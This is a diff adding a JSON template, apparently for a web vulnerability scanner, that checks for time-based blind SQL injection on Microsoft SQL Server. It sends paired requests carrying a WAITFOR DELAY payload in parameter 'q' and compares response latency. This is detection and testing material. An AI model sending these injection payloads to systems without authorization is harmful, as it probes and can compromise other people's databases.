@@ -1,0 +1,31 @@
+{
+  "name": "web/SQLi time-based blind MSSQL",
+  "description": "[high] Proves time-based blind SQLi (Microsoft SQL Server): identical injections differing ONLY in WAITFOR DELAY '0:0:0' vs '0:0:6'; latency_delta >= 3.5s isolates T-SQL execution from network noise. WAITFOR is MSSQL-exclusive syntax. Keywords: sqli blind time-based mssql waitfor delay t-sql injection. ctrl: benign/no-injection request stays fast -> not falsified. probe_url = endpoint WITHOUT query string; injection rides param q.",
+  "cwe": "CWE-89",
+  "requests": {
+    "baseline": {
+      "method": "GET",
+      "url": "{{probe_url}}?q=admin%27%20WAITFOR%20DELAY%20%270%3A0%3A0%27--%20-"
+    },
+    "payload": {
+      "method": "GET",
+      "url": "{{probe_url}}?q=admin%27%20WAITFOR%20DELAY%20%270%3A0%3A6%27--%20-"
+    }
+  },
+  "conditions": [
+    {
+      "type": "latency_delta",
+      "request_a": "baseline",
+      "request_b": "payload",
+      "min_delta": 3.5
+    }
+  ],
+  "params": [
+    "probe_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "0aaa073eb96b",
+  "created": "2026-11-05T19:30:06.502181+00:00",
+  "last_used": "2026-11-05T19:30:06.502181+00:00"
+}
